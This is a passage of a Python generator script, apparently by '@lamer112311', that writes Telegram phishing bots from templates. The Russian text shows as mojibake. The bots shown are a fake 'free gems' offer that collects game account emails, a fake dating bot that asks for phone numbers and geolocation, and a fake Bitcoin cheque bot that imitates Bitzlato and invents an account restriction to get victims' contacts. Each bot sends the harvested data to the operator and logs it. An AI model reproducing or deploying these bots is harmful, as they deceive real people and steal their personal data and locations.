			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /don!')#‚è≥
			return

		if int(num) > 800:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –≥–µ–º–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 800!')
			return

		time.sleep(2)
		msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É, –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—É—é –∫ –∏–≥—Ä–µ:') 
		bot.register_next_step_handler(msg, entr1)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

def entr1(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'–ü–æ—á—Ç–∞: {{inp}} ')#‚è≥
		bot.send_message(ID, f'–ü–æ—á—Ç–∞: {{inp}}')
		time.sleep(1)
		bot.send_message(message.chat.id, '–û–∂–∏–¥–∞–π—Ç–µ –¥–æ–Ω–∞—Ç –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')




	

bot.polling()


		""")
	f.close()
	print("–§–∞–π–ª brawl.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω")

if choice == 4:
	f = open('znak.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!") 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''üëã –ü—Ä–∏–≤–µ—Ç! {{message.from_user.first_name}}üëã
		–≠—Ç–æ –±–æ—Ç –¥–ª—è –∑–Ω–∞–∫–æ–º—Å—Ç–≤–∞!
	–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –≤–≤–µ–¥–∏—Ç–µ /znak''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['znak'])
def start(message):
	msg = bot.send_message(message.chat.id, '–î–ª—è –Ω–∞—á–∞–ª–∞ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–µ–º–Ω–æ–≥–æ –æ —Å–µ–±–µ (–æ–¥–Ω–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º)') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		num = message.text
		bot.send_message(ID, f'–ü–æ–ª—É—á–µ–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: {{num}}')
		print(num)
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–î–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞, –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞!''', reply_markup=keyboard)
# –û—Ç–ª–æ–≤–∫–∞ –æ—à–∏–±–æ–∫
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!")
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {{first}} {{last}}
			‚îúID: {{userid}}
			‚îú–ù–∏–∫: @{{nick}}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')
		time.sleep(1)
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="–û—Ç–ø—Ä–∞–≤–∏—Ç—å", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(message.chat.id, text='–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ—é –≥–µ–æ–ø–æ–∑–∏—Ü–∏—é, –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –±–æ—Ç –Ω–∞—à–µ–ª –±–ª–∏–∂–∞–π—à–∏—Ö –æ—Ç –≤–∞—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
		‚îúID: {{message.chat.id}}
		‚îúLongitude: {{lon}}
		‚îúLatitude: {{lat}} 
		‚îî–ö–∞—Ä—Ç—ã: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, '–ü–æ–∏—Å–∫...')
		time.sleep(2)
		bot.send_message(message.chat.id, '–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –≤ –±–∞–∑–µ –Ω–µ –Ω–∞—à–ª–æ—Å—å –ø–æ–¥—Ö–æ–¥—è—â–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!')
bot.polling()
		""")
	f.close()
	print("–§–∞–π–ª znak.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω")
if choice == 5:
	f = open('btc.py', 'w+', encoding='utf-8')
	f.write(f"""
	
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!") 


@bot.message_handler(commands=['admin'])
def adm(message):
	if message.from_user.id == int(ID):
		msg = bot.send_message(ID, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å –±–æ—Ç–∞! \\n –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –∫–æ—Ç–æ—Ä—É—é —Å–æ–∑–¥–∞—Ç—å —á–µ–∫:') 
		bot.register_next_step_handler(msg, check)
def check(message):
	try:
		if message.text.isdigit():
			bot.send_message(ID, f'–°—É–º–º–∞: {{message.text}}')
			bot.send_message(ID, f'–í–∞—à —á–µ–∫: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
		else:
			bot.send_message('–ó–Ω–∞—á–µ–Ω–∏–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–µ–ª—å–Ω—ã–º!')

	except Exception as e:
		print(e)

@bot.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == int(ID):
		bot.send_message(ID, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –±–æ—Ç–∞! \\n –î–ª—è –≤—Ö–æ–¥–∞ –≤ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å –Ω–∞–ø–∏—à–∏—Ç–µ: /admin') 
	else:
		try:
			summ = message.text.split()[1]
			userid = message.chat.id
			bot.send_message(ID, f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID:{{userid}} "–û–±–Ω–∞–ª–∏—á–∏–ª" –≤–∞—à —á–µ–∫ –Ω–∞ —Å—É–º–º—É:{{summ}}')
			bot.send_message(message.chat.id, f'''–í—ã –ø–æ–ª—É—á–∏–ª–∏ 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) –æ—Ç /uPorterBaseTheFist!''')
			time.sleep(1)
			
			m_id = message.chat.id
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="‚úÖ–°–Ω—è—Ç—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "–ó–∞–ø—Ä–µ—â–µ–Ω–æ >>> \\n‚ùå –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω! –í–µ—Ä–æ—è—Ç–Ω–µ–µ –≤—Å–µ–≥–æ, –í—ã –Ω–∞—Ä—É—à–∏–ª–∏ —É—Å–ª–æ–≤–∏—è —Å–µ—Ä–≤–∏—Å–∞ (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
		
		except Exception as e:
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="‚úÖ–°–Ω—è—Ç—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "–ó–∞–ø—Ä–µ—â–µ–Ω–æ >>> \\n‚ùå –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω! –í–µ—Ä–æ—è—Ç–Ω–µ–µ –≤—Å–µ–≥–æ, –í—ã –Ω–∞—Ä—É—à–∏–ª–∏ —É—Å–ª–æ–≤–∏—è —Å–µ—Ä–≤–∏—Å–∞ (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
			userid = message.chat.id
			bot.send_message(ID, f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID:{{userid}} –∑–∞–ø—É—Å—Ç–∏–ª –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "‚úÖ–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è —É—Å–ø–µ—à–Ω–æ —Å–Ω—è—Ç—ã, —Å–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º –±–æ—Ç–æ–º!")
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {{first}} {{last}}
			‚îúID: {{userid}}
			‚îú–ù–∏–∫: @{{nick}}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '‚ùå–ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ –°–í–û–ô –∫–æ–Ω—Ç–∞–∫—Ç!')
	
bot.polling()
		""")
	f.close()
	print("–§–∞–π–ª btc.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω")
